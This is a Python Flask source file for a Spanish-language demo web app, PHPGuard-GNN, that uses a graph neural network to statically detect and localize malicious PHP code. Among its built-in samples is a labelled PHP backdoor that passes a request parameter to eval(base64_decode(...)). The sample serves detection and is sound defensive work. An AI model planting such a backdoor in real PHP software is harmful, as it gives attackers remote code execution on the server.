"""PHPGuard-GNN — demo web. Uso: python3 app.py  ->  http://localhost:5000
Solo análisis estático: el código subido se parsea, NUNCA se ejecuta."""
import json
from flask import Flask, jsonify, request, Response

from detect import analyze

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 1_000_000

SAMPLES = {
    "Formulario legítimo": (
        "<?php\n// Procesa un formulario de contacto\n$nombre = htmlspecialchars($_POST['nombre'] ?? '');\n"
        "$email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);\n"
        "if ($email === false) {\n    http_response_code(400);\n    exit('Email inválido');\n}\n"
        "$stmt = $pdo->prepare('INSERT INTO contactos (nombre, email) VALUES (?, ?)');\n"
        "$stmt->execute([$nombre, $email]);\necho 'Gracias, ' . $nombre;\n"),
    "Puerta trasera simple": (
        "<?php\n// archivo con apariencia inocente\nfunction saludo($n) { return 'Hola ' . $n; }\n"
        "echo saludo('mundo');\n$cmd = $_REQUEST['c'];\n@eval(base64_decode($cmd));\n"
        "echo 'fin';\n"),
}

PAGE = r"""<!doctype html><html lang="es"><head><meta charset="utf-8"><title>PHPGuard-GNN</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<script src="https://cdnjs.cloudflare.com/ajax/libs/cytoscape/3.30.2/cytoscape.min.js"></script>
<style>
:root{--bg:#0b1020;--panel:#131a2e;--line:#243052;--tx:#e6ebff;--mut:#8a97c0;--ok:#33d6a6;--bad:#ff5470;--acc:#6c8cff}
*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--tx);font:15px/1.5 system-ui,Segoe UI,sans-serif}
header{padding:18px 28px;border-bottom:1px solid var(--line);display:flex;gap:14px;align-items:baseline}
h1{margin:0;font-size:20px}header span{color:var(--mut);font-size:13px}
main{display:grid;grid-template-columns:1fr 1fr;gap:16px;padding:16px 28px}
.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px;min-width:0}
textarea{width:100%;height:230px;background:#0d1326;color:var(--tx);border:1px solid var(--line);border-radius:8px;
 padding:10px;font:13px/1.5 ui-monospace,Menlo,Consolas,monospace;resize:vertical}
button,.btn{background:var(--acc);color:#fff;border:0;border-radius:8px;padding:8px 14px;cursor:pointer;font-weight:600}
button.ghost{background:transparent;border:1px solid var(--line);color:var(--mut);font-weight:500}
.row{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px;align-items:center}
#verdict{font-size:30px;font-weight:800;letter-spacing:.5px}
.bar{height:10px;border-radius:6px;background:#0d1326;overflow:hidden;margin-top:8px}
.bar i{display:block;height:100%;width:0;transition:width .6s}
pre{margin:0;max-height:330px;overflow:auto;background:#0d1326;border-radius:8px;padding:8px 0;font:12.5px/1.6 ui-monospace,Menlo,Consolas,monospace}
pre div{padding:0 10px;white-space:pre-wrap;word-break:break-all;border-left:3px solid transparent}
pre b{color:var(--mut);font-weight:400;display:inline-block;width:34px}
#cy{height:330px;background:#0d1326;border-radius:8px}
.tag{display:inline-block;background:#0d1326;border:1px solid var(--line);border-radius:20px;padding:2px 10px;margin:2px;font-size:12px;color:var(--mut)}
.wide{grid-column:1/-1}small{color:var(--mut)}
@media(max-width:900px){main{grid-template-columns:1fr}}
</style></head><body>
<header><h1>PHPGuard-GNN</h1><span>Detección y localización de código malicioso en PHP con redes neuronales de grafos</span></header>
<main>
<section class="card"><b>1 · Código PHP</b>
<div class="row"><small>Ejemplos:</small>__BTNS__</div>
<textarea id="code" spellcheck="false" placeholder="Pega aquí un script PHP o sube un archivo…"></textarea>
<div class="row"><button onclick="run()">Analizar</button>
<label class="btn ghost">Subir .php<input type="file" id="f" hidden accept=".php,.phtml,.inc,.txt"></label>
<small>Análisis estático: el código no se ejecuta.</small></div></section>
<section class="card"><b>2 · Veredicto</b>
<div id="verdict" style="color:var(--mut)">—</div><small id="prob"></small>
<div class="bar"><i id="barfill"></i></div>
<div class="row" id="hits"></div><small id="meta"></small></section>
<section class="card"><b>3 · Localización (líneas más influyentes)</b><pre id="heat"><div style="color:var(--mut)">Sin análisis todavía</div></pre></section>
<section class="card"><b>4 · Grafo AST — nodos coloreados por importancia para la GNN</b><div id="cy"></div></section>
</main>
<script>
const S=__SAMPLES__;
function setCode(k){document.getElementById('code').value=S[k];run()}
document.getElementById('f').onchange=e=>{const r=new FileReader();r.onload=()=>{document.getElementById('code').value=r.result;run()};r.readAsText(e.target.files[0])};
const esc=s=>s.replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));
function col(s,bad){const a=Math.min(1,s);return bad?`rgba(255,84,112,${0.05+0.55*a})`:`rgba(108,140,255,${0.04+0.3*a})`}
async function run(){
 const code=document.getElementById('code').value;if(!code.trim())return;
 const r=await fetch('/analyze',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code})});
 const d=await r.json();const bad=d.verdict==='MALICIOSO';
 const v=document.getElementById('verdict');v.textContent=d.verdict;v.style.color=bad?'var(--bad)':'var(--ok)';
 document.getElementById('prob').textContent='Probabilidad de ser malicioso: '+(d.probability*100).toFixed(1)+'%';
 const b=document.getElementById('barfill');b.style.width=(d.probability*100)+'%';b.style.background=bad?'var(--bad)':'var(--ok)';
 document.getElementById('hits').innerHTML=d.sensitive_hits.map(h=>`<span class="tag">${esc(h)}()</span>`).join('');
 document.getElementById('meta').textContent=d.n_nodes+' nodos · '+d.n_edges+' aristas en el grafo';
 const lines=code.split('\n');
 document.getElementById('heat').innerHTML=lines.map((l,i)=>{const s=d.line_scores[i]||0;
  return `<div style="background:${col(s,bad)};border-left-color:${s>.5?(bad?'var(--bad)':'var(--acc)'):'transparent'}"><b>${i+1}</b>${esc(l)||'&nbsp;'}</div>`}).join('');
 const els=[...d.graph.nodes.map(n=>({data:{id:'n'+n.id,label:n.type,score:n.score}})),...d.graph.edges.map(e=>({data:{source:'n'+e.s,target:'n'+e.t}}))];
 cytoscape({container:document.getElementById('cy'),elements:els,layout:{name:'cose',animate:false,nodeRepulsion:9000,idealEdgeLength:40},
  style:[{selector:'node',style:{'background-color':ele=>{const s=ele.data('score');return bad?`rgb(${100+155*s|0},${90-40*s|0},${120-20*s|0})`:`rgb(${90+30*s|0},${110+60*s|0},255)`},
   'width':ele=>8+22*ele.data('score'),'height':ele=>8+22*ele.data('score'),'label':ele=>ele.data('score')>.4?ele.data('label'):'','font-size':9,color:'#e6ebff','text-valign':'bottom'}},
   {selector:'edge',style:{'width':1,'line-color':'#2b3a66'}}]});
}
</script></body></html>"""


@app.get("/")
def index():
    btns = "".join(f'<button class="ghost" onclick="setCode({json.dumps(k)})">{k}</button>' for k in SAMPLES)
    html = PAGE.replace("__BTNS__", btns).replace("__SAMPLES__", json.dumps(SAMPLES))
    return Response(html, mimetype="text/html")


@app.post("/analyze")
def analyze_route():
    code = (request.get_json(force=True).get("code") or "").encode("utf8", "ignore")
    return jsonify(analyze(code[:200_000]))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
